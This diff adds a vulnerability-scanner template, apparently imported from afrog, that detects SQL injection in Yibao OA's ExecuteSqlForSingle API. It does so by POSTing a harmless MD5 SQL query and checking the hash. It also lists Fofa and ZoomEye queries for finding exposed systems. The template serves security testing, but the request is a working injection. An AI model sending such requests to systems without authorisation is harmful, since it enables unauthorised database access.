@@ -1,0 +1,31 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','afrogtest')),3,32)&strParameters
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 35198e078740db47f61ed2b2fd7618fa
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/api/system/ExecuteSqlForSingle'
+id: yibao-oa-executesqlforsingle-sqli
+info:
+  author: zan8in
+  description: |-
+    易宝OA系统ExecuteSqlForSingle接口存在SQL注入漏洞。
+    Fofa: product="顶讯科技-易宝OA系统"
+    ZoomEye: app:"易宝 OA"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 易宝OA系统ExecuteSqlForSingle接口存在SQL注入
+  severity: high
+  tags: yibao,sqli,argus-import
